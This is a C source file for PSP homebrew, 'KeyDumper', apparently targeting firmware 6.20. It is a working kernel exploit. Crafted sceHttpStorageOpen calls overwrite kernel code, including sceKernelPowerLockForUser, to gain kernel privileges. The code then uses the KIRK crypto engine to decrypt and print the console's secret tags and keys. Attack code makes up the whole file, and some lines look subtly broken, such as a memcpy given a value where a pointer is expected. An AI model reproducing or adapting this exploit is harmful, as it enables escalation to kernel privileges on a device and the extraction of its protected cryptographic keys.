#include <pspctrl.h>
#include <pspdebug.h>
#include <pspsdk.h>
#include <psploadexec.h>
#include <pspkernel.h>
#include <psputility.h>
#include <string.h>

#include "core.h"
#include "include/key.h"
#include "kirk_engine/kirk_engine.h"

PSP_MODULE_INFO("KeyDumper", PSP_MODULE_USER, 1, 0);

/**
 * PSP_THREAD_ATTR_VFPU is mandatory by this exploit
 * Because the instruction (vsync 0xffff) needs VFPU context
 */
PSP_MAIN_THREAD_ATTR(PSP_THREAD_ATTR_USER | PSP_THREAD_ATTR_VFPU);

PSP_HEAP_SIZE_KB(0);

#define printk pspDebugScreenPrintf

u8 g_tag1[4] = { 0 };
u8 g_key1[0x10] = { 0 };
u8 g_tag2[4] = { 0 };
u8 g_key2[0x10] = { 0 };

/*
 extern int sceKernelLoadModule_620(const char *path, int flags, SceKernelLMOption *option);
 extern int sceKernelStartModule_620(SceUID modid, SceSize argsize, void *argp, int *status, SceKernelSMOption *option);
 extern int sceKernelUnloadModule_620(SceUID modid);
 */

void sync_cache(void) {
	/*
	 * Beware there is a bug in PSPSDK.
	 * sceKernelIcacheInvalidateAll in pspsdk is imported as UtilsForKernel by default which cannot be used for an user PRX (returns 0x8002013A)
	 * Because of this the original kxploit by some1 used a delay by 1 second to flush i-cache. But sometimes it still fails.
	 * import.S contains sceKernelIcacheInvalidateAll as workaround
	 */
	sceKernelIcacheInvalidateAll();
	sceKernelDcacheWritebackInvalidateAll();
}

int kirk7(u8* prx, u32 size, u32 scramble_code, u32 use_polling) {

	int ret;

	((u32 *) prx)[0] = 5;
	((u32 *) prx)[1] = 0;
	((u32 *) prx)[2] = 0;
	((u32 *) prx)[3] = scramble_code;
	((u32 *) prx)[4] = size;

	if (!use_polling)
		ret = sceUtilsBufferCopyWithRange(prx, size + 20, prx, size + 20, 7);
	else
		ret = sceUtilsBufferCopyWithRange(prx, size + 20, prx, size + 20, 7);

	return ret;
}

void sprintk(const char *name, u8 *buf, int size) {
	int i;
	printk("%s ->\n", name);
	for (i = 0; i < size; ++i) {
		printk("0x%02X ", buf[i]);
	}
	printk("\n");
}

void do_dumpkey(void) {

	int i, ret = -1;
	u8 buf1[0x78] = { 0 }, buf3[0x56] = { 0 }, buf4[0x14] = { 0 }, *p;

//	SceUID g_umd9660_sema_id = 0x03DCD779;
//	ret = sceKernelWaitSema(g_umd9660_sema_id, 1, 0);
//	printk("sceKernelWaitSema return -> 0x%08X\n", ret);

	u8 prx[0x78] =
	 {
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		 0x4D, 0xDE, 0x2D, 0xEB, 0x5E, 0x1F, 0x6F, 0xDB,
		 0x4A, 0x52, 0x33, 0x79, 0xFF, 0xAF, 0xDC, 0x5C,
		 0xBE, 0xEC, 0x3E, 0x9E, 0x38, 0x7E, 0x55, 0xC7,
		 0xF5, 0x84, 0xBD, 0xD1, 0x68, 0x73, 0x8A, 0x58,
		 0x3F, 0xEE, 0xFF, 0x83, 0x57, 0xD7, 0x0D, 0x48,
		 0x27, 0x4B, 0x63, 0xC7, 0xB7, 0x9B, 0xE0, 0x83,
		 0x5B, 0x03, 0x97, 0x7B, 0x11, 0xF3, 0xA1, 0xD0,
		 0x11, 0xC5, 0x77, 0xB2, 0xAB, 0x83, 0x79, 0x21,
		 0xCA, 0xED, 0x2E, 0x82, 0xAE, 0x78, 0x17, 0x2C,
		 0x1D, 0xA3, 0x7C, 0xCF, 0x78, 0xDC, 0x70, 0xD0,
		 0x11, 0x50, 0x38, 0xC2, 0x16, 0x8D, 0xB7, 0x56,
		 0x19, 0x84, 0xEF, 0x4B, 0x9F, 0x49, 0xEE, 0xEA,
		 0x5B, 0x90, 0x81, 0x7E, 0x76, 0x1D, 0x97, 0x31
	 };

	/*SceUID *mod = sceKernelFindModuleByName("sceMesgLed");
	if (!mod)
		printk("sceMesgLed -> 0x%08X\n", mod);
	else {
		ret = sceKernelStartModule_620(mod, 0, NULL, NULL, NULL );
		if(ret < 0) {
			printk("%s: start module -> 0x%08X\n", __func__, mod);
			sceKernelUnloadModule_620(mod);
		}
	}*/

	ret = sceResmgr_8E6C62C8(prx);
	printk("sceResmgr_8E6C62C8 -> %d\n", ret);

	memcpy(buf1, prx, 0x78);

	p = &buf3;

	memcpy(&buf3[4], buf1, 0x40);
	sprintk("#1", buf3, 0x10);
	*p = 0x50;

	memcpy(&buf3[0x44], g_key6F54, 0x10);
	sprintk("#3", buf3, 0x10);

	kirk_init();

	ret = sceUtilsBufferCopyWithRange(buf3, 0x54, buf3, 0x54, 0xB);
	printk("sceUtilsBufferCopyWithRange#1 -> %d\n", ret);
	sprintk("#3", buf3, 0x10);

	memcpy(buf4, buf3, 0x14);
	sprintk("#4", buf4, 0x10);
	memcpy(&buf3[0x14], &buf1[0x40], 0x10);
	sprintk("#5", buf3, 0x10);
	ret = kirk7(buf3, 0x10, 0x56, 0);
	printk("kirk7#1 -> 0x%08X\n", ret);
	sprintk("#6", buf3, 0x10);
	if (memcmp(buf4, buf3, 0x10) != 0) {
		ret = -302;
		printk("debug#1 -> %d\n", ret);
		return;
	}

	memcpy(&buf3[0x0], &g_key6F74, 0x28);
	sprintk("#7", buf3, 0x10);
	memcpy(&buf3[0x28], &buf4, 0x14);
	sprintk("#8", buf3, 0x10);
	memcpy(&buf3[0x28 + 0x14], &buf1[0x50], 0x28);
	sprintk("#9", buf3, 0x10);

	if (sceUtilsBufferCopyWithRange(0, 0, buf3, 0x64, 0x11) != 0) {
		ret = -303;
		printk("debug#2 -> %d\n", ret);
		return;
	}

	memcpy(&buf3[0x14], buf1[0x10], 0x30);
	for (i = 0; i < 0x30; ++i) {
		buf3[0x14 + i] ^= g_key6F64[i & 0xF];
	}

	ret = kirk7(buf3, 0x30, 0x56, 0);
	for (i = 0; i < 0x30; ++i) {
		buf3[i] ^= g_key6F64[i & 0xF];
	}

	memcpy(g_tag1, &buf3[0x00], 0x04);
	memcpy(g_key1, &buf3[0x04], 0x10);
	memcpy(g_tag2, &buf3[0x14], 0x04);
	memcpy(g_key2, &buf3[0x18], 0x10);

	printk("g_tag1 -> ");
	for (i = 0; i < 0x4; ++i) {
		printk("0x%02X ", g_tag1[i]);
	}
	printk("\n");

	printk("g_key1 -> ");
	for (i = 0; i < 0x10; ++i) {
		printk("0x%02X ", g_key1[i]);
	}
	printk("\n");

	printk("g_tag2 -> ");
	for (i = 0; i < 0x4; ++i) {
		printk("0x%02X ", g_tag2[i]);
	}
	printk("\n");

	printk("g_key2 -> ");
	for (i = 0; i < 0x10; ++i) {
		printk("0x%02X ", g_key2[i]);
	}
	printk("\n");
}

void do_exploit(void) {
	//u32 kernel_entry, entry_addr;
	u32 interrupts;
	u32 i;
	int ret;

	/* Load network libraries */
	for (i = 1; i <= 6; ++i) {
		ret = sceUtilityLoadModule(i + 0xFF);
		printk("sceUtilityLoadModule 0x%02X -> 0x%08X\n", i + 0xFF, ret);
	}

	/**
	 * Write vsync 0xFFFF(0xFFFFFFFF) to @sceHttpStorage_Service@+0x00000060
	 * You can consider vsync 0xFFFF as NOP
	 * This call enables sceHttpStorageOpen to write any addresses
	 * which contains value which is greater than 0 and has alignment of 4, with vsync 0xFFFF(0xFFFFFFFF)
	 */
	ret = sceHttpStorageOpen(-612, 0, 0);
	printk("sceHttpStorageOpen#1 -> 0x%08X\n", ret);
	sync_cache();

	/* No delay need here because we flushed icache properly */

	/**
	 * Write vsync 0xFFFF(0xFFFFFFFF) to the first instruction of sceKernelPowerLockForUser
	 * Now the gate to kernel is opened :)
	 */
	ret = sceHttpStorageOpen((0x8800CC34 >> 2), 0, 0); // scePowerLock override
	printk("sceHttpStorageOpen#2 -> 0x%08X\n", ret);
	sync_cache();

	/* Call kernel_permission_call by hacked sceKernelPowerLock */
	interrupts = pspSdkDisableInterrupts();
//	kernel_entry = (u32) &kernel_permission_call;
//	entry_addr = ((u32) &kernel_entry) - 16;
//	sceKernelPowerLock(0, ((u32) &entry_addr) - 0x000040F4);
	//load_opnssmp();
	do_dumpkey();
	pspSdkEnableInterrupts(interrupts);

	/* Unload network libraries */
	for (i = 6; i >= 1; --i) {
		ret = sceUtilityUnloadModule(i + 0xFF);
		printk("sceUtilityUnloadModule 0x%02X -> 0x%08X\n", i + 0xFF, ret);
	}
}
/*
 static int load_opnssmp(const char *path, u32 tag) {
 SceUID modid;
 int opnssmp_type, ret;
 char opnssmp_path[128], *p;

 opnssmp_type = (tag >> 8) & 0xFF;
 strcpy(opnssmp_path, path);
 p = strrchr(opnssmp_path, '/');

 if (p != NULL ) {
 p[1] = '\0';
 } else {
 opnssmp_path[0] = '\0';
 }

 strcat(opnssmp_path, "OPNSSMP.BIN");
 modid = sceKernelLoadModule_620(opnssmp_path, 0, NULL );

 if (modid < 0) {
 printk("%s: load %s -> 0x%08X\n", __func__, opnssmp_path, modid);

 return modid;
 }

 ret = sceKernelStartModule_620(modid, 4, &opnssmp_type, 0, NULL );

 if (ret < 0) {
 printk("%s: start module -> 0x%08X\n", __func__, modid);
 sceKernelUnloadModule_620(modid);

 return ret;
 }

 return modid;
 }
 */

int main(int argc, char *argv[]) {
	pspDebugScreenInit();
	printk("KeyDumper (c) SmikY 6.20 Pro-C2\nYou PSP Kernel Version: 0x%08X\n", sceKernelDevkitVersion());

	do_exploit();

	printk("\nPress X to exit\n");

	while (1) {
		SceCtrlData pad;
		sceCtrlReadBufferPositive(&pad, 1);
		if (pad.Buttons & PSP_CTRL_CROSS)
			break;
		sceKernelDelayThread(10000);
	}

	sceKernelExitGame();

	return 0;
}
